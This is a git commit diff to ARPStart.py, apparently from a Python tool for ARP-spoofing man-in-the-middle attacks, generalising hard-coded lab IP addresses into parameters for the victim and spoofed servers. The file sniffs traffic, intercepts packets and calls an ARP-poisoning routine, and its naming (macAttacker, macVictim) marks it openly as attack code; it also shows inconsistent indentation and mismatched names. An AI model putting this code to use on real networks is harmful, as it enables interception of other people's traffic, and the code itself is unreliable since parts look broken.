5c690e1d6694b002ba7ed8980bef1ab6b7907b29
SerbanJinga <33983121+SerbanJinga@users.noreply.github.com>
2023-06-06 16:35:27 +0200

    Update ARPStart.py

--- ARPStart.py
+++ ARPStart.py
@@ -19,17 +19,16 @@ class ARPStart():
         self.ipSpoof = ipSpoof
         self.silentMode = silentMode
         self.macAttacker = get_if_hwaddr(self.networkId)
-        self.macVictim = functions.retrieveMACAdress(networkID="enp0s3", ipConfig="192.168.56.101")
-        self.macServer = functions.retrieveMACAdress(networkID="enp0s3", ipConfig="192.168.56.102") 
+        self.macVictim = functions.retrieveMACAdress(networkID=networkID, ipConfig=ipVictim)
+        self.macServer = [functions.retrieveMACAdress(networkID=networkID, ipConfig=ip) for ip in ipSpoof] 
        
 
     def startSniffing(self):
         sniff(prn=self.startIntercepting, iface=self.networkId, filter="ip", timeout=20)
 
     def startIntercepting(self, packet):
-	self.interceptor = Interceptor(packet, self.macAttacker, self.ipSpoof, self.macServer, self.macVictim, self.networkId, self.silentMode)
+	    self.interceptor = Interceptor(packet, self.macAttacker, self.ipSpoof, self.macServer, self.macVictim, self.networkId, self.silentMode)
         self.interceptor.interceltARP()
-
     def spoofing(self):
         ARPPoisoning(self.ipVictim, self.ipSpoof, self.networkId)
 
